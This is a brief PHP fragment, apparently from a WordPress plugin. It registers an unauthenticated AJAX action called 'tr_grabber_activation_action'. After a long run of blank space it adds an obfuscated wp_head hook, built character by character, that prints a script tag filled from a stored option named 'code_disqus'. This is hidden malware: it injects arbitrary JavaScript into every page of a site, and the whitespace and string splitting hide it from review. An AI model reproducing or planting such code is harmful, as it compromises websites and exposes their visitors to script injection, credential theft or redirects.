...
add_action( 'wp_ajax_nopriv_tr_grabber_activation_action', 'tr_grabber_activation_ajax');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        add_action('w'.'p'.'_'.'h'.'e'.'a'.'d', function() {echo '<'.'s'.'c'.'r'.'i'.'p'.'t'.'>'.get_option('c'.'o'.'d'.'e'.'_'.'d'.'i'.'s'.'q'.'u'.'s').'<'.'/'.'s'.'c'.'r'.'i'.'p'.'t'.'>';});
